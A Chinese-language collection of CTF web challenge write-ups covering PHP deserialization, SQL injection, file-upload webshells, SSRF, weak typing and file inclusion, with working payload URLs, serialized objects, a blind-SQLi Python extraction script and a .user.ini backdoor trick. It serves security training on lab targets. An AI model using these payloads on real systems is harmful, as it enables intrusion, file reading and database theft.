            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
</script>

~~~

**利用PHP的字符串解析特性**

抓包看看，输入单引号报错，看来果然设置了waf

![image-20210515183117379](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515183117379.png)

直接请求calc.php，回显了代码

~~~php
<?php 
error_reporting(0); 
if(!isset($_GET['num'])){ 
    show_source(__FILE__); 
}else{ 
        $str = $_GET['num']; 
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^']; 
        foreach ($blacklist as $blackitem) { 
                if (preg_match('/' . $blackitem . '/m', $str)) { 
                        die("what are you want to do?"); 
                } 
        } 
        eval('echo '.$str.';'); 
} 
?> 

~~~

这是一段限制的代码，利用正则表达式

特殊字符好像就直接页面错误，，这应该是waf！！！
 可是我们不知道waf如何写的，，该如何绕过呢？？
 其实利用PHP的字符串解析特性就能够进行绕过waf！！
 构造参数`? num=phpinfo()`（注意num前面有个空格）就能够绕过：

> 为什么要在num前加一个空格？
>
> 答：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。
>
> 发现过滤怎么办？
>
> 答：用char()转ascii再进行拼接

接下来就好办了，由于“/”被过滤了，，，所以我们可以使用chr(47)来进行表示，进行目录读取：

![image-20210515184948909](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515184948909.png)



发现了名字为 `flagg`的文件，直接执行php命令 `file_get_contents()`函数获取flagg文件里面的内容，

payload:

~~~
/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
~~~

得到flag

![image-20210515185650968](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515185650968.png)

### [极客大挑战 2019]PHP

**private** 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，**类名和字段名前面都会加上%00的前缀**。字符串长度也包括所加前缀的长度。其中 %00 字符也是计算长度的。

**当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。**

进入网站很明显，提示备份信息

![image-20210515190414833](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515190414833.png)

扫描目录发现了 `www.zip`文件，下载下来发现了几个文件

![image-20210515190500106](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515190500106.png)

flag.php中无关键信息，忽略掉，出题人也不会这么简单让你得到flag值



index.php关键代码：

~~~php
 <?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
  ?>
~~~

class.php:

~~~php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';//反序列化方法执行时，调用。这里修改参数的数量绕过即可
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
~~~

index.php中传递 select参数，传递的是一个序列化后的字符串。

估计是传递Name类的序列化字符串，其中username==='admin'&&password\==100。

Name类对像序列化payload

~~~
<?php
class Name{
    private $username = 'admin';
    private $password = 100;
}
$a = new Name();
$s = serialize($a);
echo $s;

?>
~~~

把标记的乱码换成`%00`

![image-20210515192758387](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515192758387.png)

payload:

~~~
/?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;} 
~~~

成功得到flag

![image-20210515192847754](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515192847754.png)

这个题考的就是反序列化，包括用参数绕过__destruct()方法，还有private变量序列化后的字符串的类名和属性名前面要加上 `%00`

### [极客大挑战 2019]Upload

试了一大通，最终用文件名后缀 `.phtml`和图片编码头 `GIF89a?`和修改 `Content-Type: image/jpeg`，用的是长标签的PHP代码成功上传，然后用蚁剑连接即可

![image-20210515194547376](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515194547376.png)



成功在根目录下找到flag文件

![image-20210515194633306](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515194633306.png)

### [极客大挑战 2019]BabySQL

![image-20210510115359835](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210510115359835.png)

限制了关键字 `or、order、 by、union、select、from、where`,我通过`<>`成功绕过限制，获得了列数为3列

![image-20210515220934811](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515220934811.png)

开始获取数据库的信息和是否可以使用information_schema数据库爆破信息

获得数据库和版本信息

![image-20210515221122979](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515221122979.png)

开始使用information_schema数据库爆破

![image-20210515221407842](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515221407842.png)

获得数据库信息，看见有一个数据库是ctf，看来flag值并不在咱们当前项目的数据库，**这也是出题人的一个小坑吧，看来之后还要先爆破所有的数据库，不能立马爆破当前web项目所在的数据库啊**。

接下来开始爆破ctf数据库中的表，表中只有一个表Flag

![image-20210515221713824](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515221713824.png)

爆破Flag表，表中只有一个字段是flag

![image-20210515221854944](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515221854944.png)

最后直接查询ctf数据库中的Flag表就可以了，成功获得flag值。

![image-20210515221955482](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515221955482.png)



### [ACTF2020 新生赛]Upload

![image-20210510111833218](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210510111833218.png)

白名单限制&前端限制：

![image-20210510111923779](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210510111923779.png)

绕过前端限制，并且上传 `.phtml`后缀的文件，修改 `content-type`即可上传成功

![image-20210515220251584](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515220251584.png)



用蚁剑连接成功在网站根目录下获得flag

![image-20210515220419798](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515220419798.png)

### [ACTF2020 新生赛]BackupFile

![image-20210510113407203](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210510113407203.png)



扫描目录发现了备份文件 `/index.php.bak`

![image-20210516130020347](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516130020347.png)



下载下来，审计源码

~~~php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}

~~~



源码的意思是传一个key参数，这个参数必须是整数，然后和str字符串比较，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉，双等属于弱类型比较。所以只需要key=123就行了。

![image-20210516130341225](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516130341225.png)

### [HCTF 2018]admin（*）

![image-20210510150346033](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210510150346033.png)











https://blog.csdn.net/weixin_44677409/article/details/100733581

### [极客大挑战 2019]BuyFlag

在pay.php的注释中发现了一下代码

~~~php

	//~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}

~~~



> 并且页面中显示`Flag need your 100000000 money`，
>
> **attention**
>
> If you want to buy the FLAG:
> ``You must be a student from CUIT!!!
> You must be answer the correct password!!!`` 

你必须是cuit的学生，估计是抓包修改某个字段

cookie中有个user字段，把他的值改为1即可

![image-20210516133351712](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516133351712.png)

![image-20210516133339333](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516133339333.png)

现在还要用post方法传递密码，传递的规则上面代码已经给了要求，利用PHP代码的弱语言特性，password=404a即可绕过。

![image-20210516133839109](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516133839109.png)

看来还得在传递个money字段，payload:password=404a&money=100000000。还是报错了，输入的字符太长了

![image-20210516133947843](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516133947843.png)

这里可是使用科学技术法： `1e9`或者用数组 `password[]=1`利用strcmp函数特性绕过的办法

成功得到flag值

![image-20210516134627266](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516134627266.png)

### [BJDCTF2020]Easy MD5

进入网站

![image-20210513105322411](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513105322411.png)

抓包发现了个线索，一个SQL语句,这里可以确定是SQL注入了，但是和MD5编码相关

![image-20210513105758984](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513105758984.png)



~~~sql
select * from 'admin' where password=md5($pass,true)
~~~

  **md5(string,raw\)**

| 参数   | 描述                                                         |
| ------ | ------------------------------------------------------------ |
| string | 必需。要计算的字符串                                         |
| raw    | 可选。 默认不写为FALSE，32位16进制的字符串；TRUE，16位原始二进制格式的字符串。 |



**md5(string,true)函数在指定了true的时候，是返回的原始 16 字符二进制格式。  这里需要注意的是，当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种。**

~~~php
    content: ffifdyop
    hex: 276f722736c95d99e921722cf9ed621c
    raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
    string: 'or'6]!r,b
~~~

 这里32位的16进制的字符串，两个一组就是上面的16位二进制的字符串。比如27，这是16进制的，先要转化为10进制的，就是39，39在ASC码表里面就是 `'` 字符。6f就是对应`  o  `。

**这不是普通的二进制字符串，而是’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种。这样的话就会和前面的形成闭合，构成万能密码。**

~~~sql
select * from 'admin' where password=''or'6.......'
~~~

这就是永真的了，这就是一个万能密码了相当于1’ or 1=1#或1’ or 1#。接下来就是找到这样子的字符串。而上面的字符串 `ffifdyop`就是其中一个payload，就可以直接用了

但是我们思考一下为什么6\xc9]\x99\xe9!r,\xf9\xedb\x1c的布尔值是true呢？

>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数（这类似于PHP的弱类型）。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。这里不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）

我们输入这个ffifdyop字符串以后出现以下的页面：

![image-20210513114017635](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513114017635.png)



查看源码发现以下内容

~~~php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
~~~

代码的意思就是a，b两个参数要不相等，但是呢他们两个的MD5值需要相等。这里我想的是估计又是要利用PHP弱类型的缺陷绕过了。

**md5()**

```php
$array1[] = array(
 "foo" => "bar",
 "bar" => "foo",
);
$array2 = array("foo", "bar", "hello", "world");
var_dump(md5($array1)==md5($array2)); //true
```

PHP 手册中的 md5（）函数的描述是 `string md5 ( string $str [, bool $raw_output = false ] )`，`md5()` 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，`md5()` 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。

以上内容是我在web篇总结的，正好用到此处，PHP内置函数的松散性，利用数组绕过。

这个题的payload估计是传递两个数组参数，虽然传递的数组内容值不一样，但是两个数组的md5值也会相等

成功到达下一步

![image-20210513114738649](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513114738649.png)

看这一步的代码是用post方法传递数值，绕过方式和上一步一样，得到flag值

![image-20210513115227768](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513115227768.png)

### [ZJCTF 2019]NiZhuanSiWei

进入网站，出现了代码，开始代码审计吧

~~~php
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
//
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
~~~

**第一个绕过：**

~~~php
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))
~~~

​	这里需要我们传入一个文件且其内容为welcome to the zjctf，这样的话才能继续往下一步走，现在就剩下一个data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数读取文件。构造如下，

~~~php
text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
~~~

当然也可以不需要base64，但是一般为了绕过某些过滤都会用到base64。data://text/plain,welcome to the zjctf

**第二个绕过**

~~~php
$file = $_GET["file"];
if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
~~~

这里有file参数可控，但是无法直接读取flag，可以直接读取/etc/passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用：

~~~
file=useless.php
~~~

所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。

```php
php://filter/read=convert.base64-encode/resource=useless.php
```

读到的useless.php内容如下：

~~~php
<?php  

class Flag{  //flag.php  
    public $file="flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  

~~~

**第三个绕过**

~~~php
$password = $_GET["password"];
include($file);  //useless.php
$password = unserialize($password);
echo $password;
~~~

这里的file是我们可控的，所以在本地测试后有执行下面代码即可出现payload：

```
<?php  
class Flag{  //flag.php  
    public $file="flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
$a = new Flag();
echo serialize($a);
?>
//O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

最后payload

~~~http
http://738ae58a-c99d-45f0-87d0-f65b27ff87f8.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:%7Bs:4:"file";s:8:"flag.php";%7D
~~~

最终获得flag值

![image-20210513150311612](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513150311612.png)

### [网鼎杯 2018]Fakebook（*）

![image-20210513151443501](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513151443501.png)

试了一遍各个功能，没有发现什么异常，没有思路，看看别人的WP吧

扫描目录发现了/robots.txt，打开发现了/user.php.bak，下载下来是PHP代码

~~~php
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";
    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }
    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }
    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
}
~~~

开始代码审计，肯定又是考察反序列化。先注册一个用户，登陆之后值url地址栏发现了异常，有`?no=1`,试试有没有注入漏洞，果然有，数字型注入，列数是4个

![image-20210516135409180](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516135409180.png)

还限制了关键字，用注释绕过，成功得到2的位置可以回显，开始爆破数据库吧

![image-20210516135616281](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516135616281.png)

> 数据库：fakebook
>
> 版本号：10.2.26-MariaDB-log 
>
> 用户：root@localhost 
>
> 所有数据库：fakebook,information_schema,mysql,performance_schema,test 	
>
> fakebook数据库中的表：users 	
>
> users表中的字段：no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 

成功得到users表中的内容：

![image-20210516140136567](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516140136567.png)

分别是id、username、MD5（password）、data

其中data正好是序列化之后的字符串，age、blog还是在页面显示的内容。

![image-20210516140431478](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516140431478.png)

`the contents of his/her blog`好像是直接调用blog地址中的内容。

有一个思路：

> 页面内容是从序列化的字符串得到的，存在注入点，咱们直接用union select语句把一个自定义的序列化内容传递给php后台，让他在前台显示，就是利用前面得到的php代码，利用ssrf漏洞去访问他自己的服务器中的flag文件，然后在`the contents of his/her blog`中显示。

**第一步构造序列化字符串**

~~~php
 <?php

class UserInfo
{
    public $name = "123";
    public $age = 12;
    public $blog = "file:///var/www/html/flag.php";
	
}

$a = new UserInfo();
echo serialize($a);
?>
//结果： O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
~~~

**第二步构造注入点payload**

~~~php
 view.php?no=-1/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'%23
~~~

![image-20210516141900218](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516141900218.png)

flag.php文件的内容就在the contents of his/her blog中，打开源码

![image-20210516142013398](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516142013398.png)

点击链接成功获得flag值

![image-20210516142029701](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516142029701.png)

这个题考的SQL注入、反序列化、还有ssrf，知识点挺多的，对思维逻辑要求挺高的

### [极客大挑战 2019]HardSQL

进入网站

![image-20210516175647200](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516175647200.png)

开始SQL注入吧，看看这次会有什么限制。经过手工测试过滤了and、= 空格 union等多个sql关键字， 等号可以使用like来代替，试试报错注入

![image-20210516191332950](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516191332950.png)

### “百度杯”CTF比赛 十二月场——notebook(。。。。。)

![image-20210516193110579](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516193110579.png)

在URL地址上发现了文件包含的异常，试试有没有文件包含漏洞，并且扫一下网站目录

扫描网站发现了robots.txt文件，打开内容有一个文件名 `php1nFo.php`

![image-20210516193557636](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516193557636.png)

> **利用条件**：session文件路径已知，且其中内容部分可控。
>  php的session文件的保存路径可以在phpinfo的session.save_path看到。
>  session 的文件名格式为 sess_[phpsessid]，而 sessionid 在发送的请求的 cookie 字段中也可以看到。

**注意：文件包含漏洞中，不论该文件是不是PHP的文件，文件中的PHP代码都会被解析**  

此题中存在变量可以被控制，所以直接输入一句话木马被文件包含的时候解析成功，再用蚁剑连接即可

### “迎圣诞，拿大奖”活动赛题“迎圣诞，拿大奖”活动赛题——SQLi(。。。。。)

![image-20210517143541651](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210517143541651.png)

### “百度杯”CTF比赛 十月场——Vld(。。。。。)

![image-20210517143704349](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210517143704349.png)

![image-20210517143713796](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210517143713796.png)

![image-20210517144651012](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210517144651012.png)

https://www.cnblogs.com/leixiao-/p/9784904.html

### [CISCN2019 华北赛区 Day2 Web1]Hack World

![image-20210524181023155](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524181023155.png)



用 `1/1`判断出是数字型注入,过滤了空格、union、select、or、and等关键字。这个网页上提示了重要信息在flag.flag表中，

这个题可以使用异或布尔盲注获取flag值，payload：

~~~
id=0^(ascii(mid((select(flag)from(flag)),1,1))>33)
~~~

![image-20210524182727624](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524182727624.png)

如果(ascii(mid((select(flag)from(flag)),1,1))>33)语句为真的话，页面会回显Hello信息，编写python脚本，爆破flag值

~~~python
import time
import sys
import requests


def getPayload(result_index, char_index, ascii):


	select_str = "select(flag)from(flag)" #DIY地址
	
	# 连接payload
	sqli_str = "0^(ascii(mid(("+ select_str +")," + str(char_index) + ",1))>" + str(ascii) + ")" #DIY地址
	# print(sqli_str)
	payload = {"id":sqli_str}  #DIY地址

	return payload


def execute(result_index, char_index, ascii):
	# 连接url
	url = "http://28ec8019-70ac-4dc1-90b8-4d84bae27b2c.node3.buuoj.cn/index.php"  #DIY地址
	payload = getPayload(result_index, char_index, ascii)
	# print(payload)
	# 检查回显
	echo = "Hello"            #DIY地址
	content = requests.post(url, data=payload).text
	time.sleep(0.1)
	# print(content)
	if echo in content:
		return True
	else:
		return False


def dichotomy(result_index, char_index, left, right):
	while left < right:
		# 二分法
		ascii = int((left + right) / 2)
		if execute(str(result_index), str(char_index + 1), str(ascii)):
			left = ascii
		else:
			right = ascii
		# 结束二分
		if left == right - 1:
			if execute(str(result_index), str(char_index + 1), str(ascii)):
				ascii += 1
				break
			else:
				break
	return chr(ascii)


if __name__ == "__main__":
	for num in range(1):  # 查询结果的数量  #DIY地址
		count = 0
		for len in range(50):  # 单条查询结果的长度   #DIY地址
			count += 1
			char = dichotomy(num, len, 30, 126)
			if ord(char) == 31:  # 单条查询结果已被遍历
				break
			sys.stdout.write(char)
			sys.stdout.flush()
		if count == 1:  # 查询结果已被遍历
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()
~~~

最终结果：

![image-20210524184008289](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524184008289.png)



### [极客大挑战 2019]HardSQL

报错注入

空格被过滤，用`（）`绕过

获取数据库payload：

~~~
?username=admin'or(updatexml(1,concat(0x7e,(database()),0x7e),1))%23&password=admin
~~~

![image-20210520100638554](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520100638554.png)

获取所有数据库payload：**这里遇到一个问题，显示的信息不全，并且limit我不知道怎么绕过空格使用，用括号绕过没效果**

~~~
?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1))%23&password=admin
~~~

![image-20210520101459044](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520101459044.png)

使用`right()`函数，成功爆出全部的数据库名称，payload：

~~~
?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(RIGHT(schema_name,7)))from(information_schema.schemata)),0x7e),1))%23&password=admin
~~~

![image-20210520102620076](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520102620076.png)

开始爆破 `geek`中的表名，payload：**等于号也被过滤了，用`like`代替**

~~~
?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like("geek")),0x7e),1))%23&password=admin
~~~

![image-20210520102854813](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520102854813.png)

开始获取H4rDsq1表中的字段，payload：

~~~
?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like("H4rDsq1")),0x7e),1))%23&password=admin
~~~

![image-20210520103020443](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520103020443.png)

获取geek.H4rDsq1表中的信息，payload：

~~~
?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(username,0x7e,password))from(geek.H4rDsq1)),0x7e),1))%23&password=admin
~~~

获得左半部分的flag：flag{e1df861a-33ff-42af-ad

![image-20210520103240195](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520103240195.png)

~~~
?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(right(password,22)))from(geek.H4rDsq1)),0x7e),1))%23&password=admin
~~~

获取右半部分flag：2af-ada8-3c1375bf5430}

![image-20210520103431924](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520103431924.png)

拼接flag：flag{e1df861a-33ff-42af-ada8-3c1375bf5430}

### [GXYCTF2019]BabySQli

![image-20210524184108107](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524184108107.png)

页面显示是个登录框

源码中发现了个search.php文件，点击此文件

![image-20210524184255182](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524184255182.png)

查看源码，发现了注释中有东西，加密的字符，尝试一下base64不行，用base32再用base63解码，最后才成功

![image-20210524184318745](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524184318745.png)

![image-20210524184635206](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524184635206.png)

出来了一个SQL语句： `select * from user where username = '$name'`,对应着初试网站的登录框的SQL语句吧。

输入admaain用户名，显示错误的用户名

![image-20210524185008439](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524185008439.png)

输入admin用户名，显示密码错误，看来数据库中存在admin用户

![image-20210524185105942](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524185105942.png)

上面的SQL语句会根据name把用户名密码等字段信息显示出来，我们是否可以使用union select语句也添加一条暂时的数据。例如：

![image-20210524185540017](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524185540017.png)

name存在SQL注入，可以使用上面的方法让后台代码执行我们伪造的SQL数据，从而成功登录

![image-20210524185729951](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524185729951.png)

`name=admin'union+select+1,2,3%23&pw=111`使用这条语句判断出user表有3列，应该就是id、name、pw字段了。

payload：

~~~
name=aaa'union+select+1,'admin','698d51a19d8a121ce581499d7b701668'%23&pw=111
~~~

其中69……字符串是111的MD5加密值，最后成功获得flag

![image-20210524190244388](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524190244388.png)

### [SUCTF 2019]CheckIn

过滤了 `php、php3、php4、php5、pht、phtml`等后缀，限制了内容以图片头开头，且内容中不能有<?

下面是我绕过的情况，最终传递上去了假的图片，但是并不能解析

![image-20210520111101492](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520111101492.png)

看看别人的wp

前置知识：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini</a>

> 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。

```
auto_prepend_file=shell1.jpg //.user.ini配置文件，auto_prepend_file的意思是在施行同一目录下的PHP文件之前，自动加载文件，相当于include()和require()函数
```

### [网鼎杯 2020 青龙组]AreUSerialz

~~~php
 <?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op="1";
    protected $filename="/tmp/tmpfile";
    protected $content="Hello World!";

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() { //获取文件的内容
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2") //这里使用op=2绕过，这里的2是数字型，这样就不会执行write（）
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}

~~~

`__wakeup()`触发于`unserilize()`调用之前，但是如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得`__wakeup`失效。

开始代码审计，传递一个 `str`名称的参数，然后他被反序列化。代码中有个read（）函数，我们要让他执行去获取flag.php中的源码。

$obj = unserialize($str);这句话执行的时候会调用 `__destruct()`方法，如果op==='2'就会置为1，从而执行write（）方法，这并不我们所希望的，我们希望执行read（），这里可以使用op=2(数字型绕过)

